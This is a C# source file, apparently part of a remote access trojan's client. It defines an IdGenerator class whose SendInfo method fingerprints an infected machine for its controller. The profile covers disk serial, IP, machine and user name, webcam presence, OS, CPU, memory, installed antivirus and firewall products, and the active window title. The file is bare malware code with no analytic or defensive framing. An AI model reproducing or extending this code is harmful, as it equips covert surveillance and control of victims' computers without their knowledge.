using Lime.NativeMethods;
using Lime.Settings;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Globalization;
using System.Management;
using System.Net;
using System.Text;

namespace Lime.Helper
{
    public static class IdGenerator
    {
        public static string SendInfo()
        {
            return "Information" + Config.key + Config.id + Config.key + StringConverter.Encode("_" + GetHardDiskSerialNumber()) + Config.key + IdGenerator.GetIp() + Config.key + StringConverter.Encode(Environment.MachineName + " / " + Environment.UserName) + Config.key + GetCamera() + Config.key + StringConverter.Encode(new ComputerInfo().OSFullName + " " + GetSystem()) + Config.key + StringConverter.Encode(GetCpu()) + Config.key + new ComputerInfo().TotalPhysicalMemory + Config.key + GetAV("Select * from AntiVirusProduct") + Config.key + GetAV("SELECT * FROM FirewallProduct") + Config.key + Config.port + Config.key + GetActiveWindow() + Config.key + StringConverter.Encode(CultureInfo.CurrentCulture.Name) + Config.key + "False";
        }

        [Obsolete]
        public static string GetIp()
        {
            try
            {
                return ((IPAddress)Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
            }
            catch
            {
                return "N/A";
            }
        }
        public static string GetHardDiskSerialNumber()
        {
            try
            {
                string text = Interaction.Environ("SystemDrive") + "\\";
                string text2 = null;
                int t = 0;
                int num = 0;
                int num2 = 0;
                string text3 = null;
                int number = 0;
                Native.GVI(ref text, ref text2, t, ref number, ref num, ref num2, ref text3, 0);
                return Conversion.Hex(number);
            }
            catch { }
            return "ERR";
        }
        public static string GetCamera()
        {
            try
            {
                int num = 0;
                for (; ; )
                {
                    short wDriver = (short)num;
                    string text = Strings.Space(100);
                    int cbName = 100;
                    string text2 = null;
                    bool flag = Native.capGetDriverDescriptionA(wDriver, ref text, cbName, ref text2, 100);
                    if (flag)
                    {
                        break;
                    }
                    num++;
                    if (num > 4)
                    {
                        goto Block_3;
                    }
                }
                return "Yes";
            Block_3:;
            }
            catch { }
            return "No";
        }

        public static string GetSystem()
        {
            try
            {
                foreach (ManagementObject SC in new ManagementObjectSearcher("select * from Win32_Processor").Get())
                {
                    return Convert.ToInt32(SC["AddressWidth"]).ToString();
                }
            }
            catch
            {
                return "N/A";
            }
            return "N/A";

        }

        public static string GetAV(string product)
        {
            try
            {
                string PN = string.Empty;
                foreach (ManagementObject AV in new ManagementObjectSearcher("root\\SecurityCenter" + (new ComputerInfo().OSFullName.Contains("XP") ? "" : "2").ToString(), product).Get())
                {
                    PN += AV["displayName"];
                }
                if ((PN != string.Empty))
                {
                    return StringConverter.Encode(PN);
                }
                else
                {
                    return StringConverter.Encode("N/A");
                }
            }
            catch
            {
                return StringConverter.Encode("N/A");
            }
        }
        public static string GetCpu()
        {
            try
            {
                return Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null).ToString();
            }
            catch
            {
                return "N/A";
            }
        }
        public static string GetActiveWindow()
        {
            StringBuilder W = new StringBuilder(256);
            Native.GetWindowText(Native.GFW(), W, W.Capacity);
            return StringConverter.Encode(W.ToString());
        }
    }
}
